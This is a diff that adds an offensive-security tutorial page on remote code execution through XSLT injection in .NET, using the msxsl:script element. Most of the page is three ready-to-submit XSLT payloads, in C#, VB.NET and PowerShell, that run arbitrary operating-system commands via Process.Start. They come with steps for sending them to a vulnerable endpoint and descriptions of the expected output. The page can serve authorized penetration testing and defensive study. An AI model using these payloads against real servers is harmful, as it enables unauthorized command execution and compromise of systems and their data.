@@ -1,0 +1,162 @@
+---
+title: Remote Code Execution with Native .NET Explained
+description: Learn how to achieve remote code execution using .NET's msxsl:script
+  in XSLT injection for web server environments.
+keywords:
+- Remote Code Execution
+- .NET
+- msxsl:script
+- XSLT Injection
+- C#
+- VB.NET
+- PowerShell
+- Process.Start
+- XML Parsing
+- Cybersecurity
+---
+
+# Remote Code Execution with Native .NET
+
+## Context
+
+Remote Code Execution (RCE) through XSLT injection using native .NET capabilities is a potent technique used in offensive cybersecurity operations. This technique leverages the `msxsl:script` extension to embed C# or VB.NET code within XSLT stylesheets, which enables attackers to execute arbitrary commands on the target machine. Knowledge of XSLT processing, XML parsing, .NET framework, and prior experience with XSLT Injection is assumed for this process.
+
+## Theory
+
+### Native .NET XSLT Scripting Capabilities
+
+The `msxsl:script` element is a powerful feature within .NET XSLT processors that facilitates the embedding and execution of inline .NET code, typically written in C# or VB.NET, directly within XSLT stylesheets. When a vulnerable application processes an XSLT input, it may inadvertently execute injected `msxsl:script` code, leading to arbitrary command execution.
+
+### Execution Context and Trust Boundaries
+
+When XSLT transformations occur within a web application, they often inherit the same permissions and execution context as the application itself. This includes the ability to execute commands on the operating system. An attacker can exploit this by injecting an `msxsl:script` block, triggering code execution, and retrieving output through the XSLT transformation process.
+
+### Common Exploitation Patterns
+
+- **System.Diagnostics.Process.Start**: Frequently used to invoke OS commands from within C#/VB.NET code by setting `ProcessStartInfo` parameters such as `FileName` and `Arguments`.
+- **Assembly.Load or Reflection**: Advanced techniques to load arbitrary .NET assemblies and execute methods directly or via PowerShell scripts.
+
+## Practice
+
+### Remote Code Execution via `msxsl:script` (C#) Injection
+
+- **Payload:**
+
+```xml
+<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+                xmlns:msxsl="urn:schemas-microsoft-com:xslt"
+                xmlns:user="urn:my-scripts" version="1.0">
+  <msxsl:script language="C#" implements-prefix="user">
+    public string Execute(string cmd) {
+      System.Diagnostics.Process proc = new System.Diagnostics.Process();
+      proc.StartInfo.FileName = "cmd.exe";
+      proc.StartInfo.Arguments = "/c " + cmd;
+      proc.StartInfo.UseShellExecute = false;
+      proc.StartInfo.RedirectStandardOutput = true;
+      proc.Start();
+      string output = proc.StandardOutput.ReadToEnd();
+      proc.WaitForExit();
+      return output;
+    }
+  </msxsl:script>
+  <xsl:template match="/">
+    <xsl:value-of select="user:Execute('whoami')"/>
+  </xsl:template>
+</xsl:stylesheet>
+```
+
+- This payload injects C# code into an XSLT stylesheet, allowing OS command execution and output retrieval.
+
+- **Execution:**
+  - Submit this payload as the XSLT input to the vulnerable endpoint processing XSLT.
+
+- **Expected Output:**
+
+```
+text block
+Output will contain the result of the executed command (e.g., current user).
+```
+
+### Remote Code Execution via `msxsl:script` (VB.NET) Injection
+
+- **Payload:**
+
+```xml
+<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+                xmlns:msxsl="urn:schemas-microsoft-com:xslt"
+                xmlns:user="urn:my-scripts" version="1.0">
+  <msxsl:script language="VB" implements-prefix="user">
+    Public Function Execute(cmd As String) As String
+      Dim proc As New System.Diagnostics.Process()
+      proc.StartInfo.FileName = "cmd.exe"
+      proc.StartInfo.Arguments = "/c " & cmd
+      proc.StartInfo.UseShellExecute = False
+      proc.StartInfo.RedirectStandardOutput = True
+      proc.Start()
+      Dim output As String = proc.StandardOutput.ReadToEnd()
+      proc.WaitForExit()
+      Return output
+    End Function
+  </msxsl:script>
+  <xsl:template match="/">
+    <xsl:value-of select="user:Execute('whoami')"/>
+  </xsl:template>
+</xsl:stylesheet>
+```
+
+- This VB.NET variant accomplishes the same command execution in environments where C# support is unavailable.
+
+- **Execution:**
+  - Submit the payload to the vulnerable XSLT processing endpoint.
+
+- **Expected Output:**
+
+```
+text block
+Output will display command execution result.
+```
+
+### Remote Code Execution via PowerShell from XSLT
+
+- **Payload:**
+
+```xml
+<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+                xmlns:msxsl="urn:schemas-microsoft-com:xslt"
+                xmlns:user="urn:my-scripts" version="1.0">
+  <msxsl:script language="C#" implements-prefix="user">
+    public string RunPS(string cmd) {
+      System.Diagnostics.Process proc = new System.Diagnostics.Process();
+      proc.StartInfo.FileName = "powershell.exe";
+      proc.StartInfo.Arguments = "-Command \"" + cmd + "\"";
+      proc.StartInfo.UseShellExecute = false;
+      proc.StartInfo.RedirectStandardOutput = true;
+      proc.Start();
+      string output = proc.StandardOutput.ReadToEnd();
+      proc.WaitForExit();
+      return output;
+    }
+  </msxsl:script>
+  <xsl:template match="/">
+    <xsl:value-of select="user:RunPS('Get-ChildItem C:\\')"/>
+  </xsl:template>
+</xsl:stylesheet>
+```
+
+- This technique allows execution of arbitrary PowerShell commands, significantly enhancing the attacker's post-exploitation capabilities.
+
+- **Execution:**
+  - Send the payload to the vulnerable XSLT endpoint.
+
+- **Expected Output:**
+
+```
+text block
+Output will show PowerShell command results.
+```
+
+## Tools
+
+- **Burp Suite**
+- **curl**
+- **Postman**
